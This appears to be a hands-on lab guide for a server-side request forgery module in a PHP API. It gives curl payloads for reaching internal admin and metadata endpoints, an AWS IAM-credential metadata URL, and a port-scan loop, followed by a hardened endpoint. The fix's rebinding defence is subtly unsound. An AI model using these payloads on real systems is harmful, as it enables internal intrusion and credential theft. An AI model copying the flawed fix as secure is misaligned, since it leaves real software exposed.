# API7:2023 — Server Side Request Forgery (SSRF)

**Module file:** `php-api/src/modules/ssrf.php`  
**Vulnerable endpoint:** `GET /api/ssrf?url=<target>`  
**Secure endpoint:** `GET /api/ssrf/secure?url=<target>`

## What This Vulnerability Is

SSRF occurs when the server makes an HTTP request to a destination controlled by the attacker. The PHP container in this lab lives inside Docker's `lab_network` and can reach any other container on that network by hostname. The Node.js container is on the same network but has no exposed ports — it is completely unreachable from your browser or any external tool.

The vulnerable endpoint accepts a `url` parameter and fetches it using cURL without validating the destination. By pointing the URL at `http://node-internal:3000/admin`, the attacker routes a request through the PHP server to the hidden internal service and receives the response — secrets that should be completely inaccessible from the internet.

This attack is realistic because many cloud environments have internal metadata endpoints (AWS EC2 metadata at `169.254.169.254`) that contain IAM credentials. An SSRF vulnerability gives attackers a path to those credentials through the application server.

## The Exploit — Step by Step

### Understanding the Network Boundary

From your machine (outside Docker):

```
You --> http://localhost:8080/api/ssrf   ✓ reachable (PHP port is mapped)
You --> http://localhost:3000/admin      ✗ NOT reachable (Node has no port mapping)
```

From inside the PHP container (inside Docker):

```
php-api --> http://node-internal:3000/admin   ✓ reachable (same Docker network)
php-api --> http://mysql:3306                 ✓ reachable (same Docker network)
```

The SSRF attack bridges these two perspectives.

### Attack 1 — Reach the Internal Admin Route

```bash
curl 'http://localhost:8080/api/ssrf?url=http://node-internal:3000/admin'
```


The PHP server fetched `node-internal:3000/admin` on behalf of the attacker and returned the response. This endpoint contains the database password — which you could not obtain from outside Docker directly.

### Attack 2 — Extract Cloud-Style Metadata

```bash
curl 'http://localhost:8080/api/ssrf?url=http://node-internal:3000/metadata'
```
In a real AWS environment, this attack would be:
```bash
curl 'http://your-api.com/api/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name'
```
Which would return AWS access keys granting the attacker full access to whatever IAM role the EC2 instance has.

### Attack 3 — Internal Service Discovery

```bash
# Probe internal hosts using the PHP server as a scanner
for PORT in 80 443 3000 8080 8443 27017 6379; do
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' \
    "http://localhost:8080/api/ssrf?url=http://node-internal:$PORT/health")
  echo "node-internal:$PORT -> HTTP $STATUS"
done
```

This uses PHP as a port scanner against internal hosts. Any port that responds (non-zero status) is live.

## The Vulnerable Code

`curl_init($url)` receives the URL directly from `$_GET['url']`. There is zero validation between reading the user input and passing it to cURL. The `fetched_url` field in the response even confirms back to the attacker which URL was fetched, which is useful for reconnaissance.

## The Fix — Exactly What Changed

```php
if ($uri === '/api/ssrf/secure') {
    $url = $_GET['url'] ?? null;
    if (!$url) json_response(['error' => 'url required'], 400);

    // FIX 1: Hostname whitelist
    $allowed = ['api.openweathermap.org', 'api.github.com'];
    $parsed  = parse_url($url);
    $host    = $parsed['host'] ?? '';
    if (!in_array($host, $allowed, true)) {
        json_response(['error' => 'Host not in whitelist: ' . $host], 400);
    }

    // FIX 2: Block private IP ranges after DNS resolution
    $ip      = gethostbyname($host);
    $private = ['10.', '172.', '192.168.', '127.', '0.', '169.254.'];
    foreach ($private as $prefix) {
        if (strpos($ip, $prefix) === 0) {
            json_response(['error' => 'Internal addresses blocked'], 400);
        }
    }

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $resp = curl_exec($ch);
    curl_close($ch);
    json_response(['body' => json_decode($resp, true) ?? $resp]);
}
```

**Added — hostname whitelist check:**
```php
$allowed = ['api.openweathermap.org', 'api.github.com'];
$parsed  = parse_url($url);
$host    = $parsed['host'] ?? '';
if (!in_array($host, $allowed, true)) {
    json_response(['error' => 'Host not in whitelist: ' . $host], 400);
}
```
`parse_url()` extracts the host component of the URL. Only hostnames in the `$allowed` array are permitted. `node-internal`, `mysql`, `127.0.0.1`, `169.254.169.254` — none of these are in the list. The `true` third argument to `in_array()` enables strict type comparison, preventing bypass techniques that rely on type coercion.

**Added — post-DNS private IP block:**
```php
$ip = gethostbyname($host);
$private = ['10.', '172.', '192.168.', '127.', '0.', '169.254.'];
foreach ($private as $prefix) {
    if (strpos($ip, $prefix) === 0) {
        json_response(['error' => 'Internal addresses blocked'], 400);
    }
}
```
This is a defence against DNS rebinding attacks. An attacker could register a public domain `evil.com` that initially resolves to a legitimate public IP (passing the whitelist), then immediately change the DNS record to resolve to `169.254.169.254`. By resolving the hostname to an IP after whitelist validation and blocking RFC 1918 ranges, this second check catches that technique. Both checks together are necessary — the whitelist alone is not sufficient.

**Removed — `fetched_url` from the response:**  
The secure endpoint no longer includes `fetched_url` in the response. This removes the reconnaissance value that the vulnerable endpoint accidentally provided.
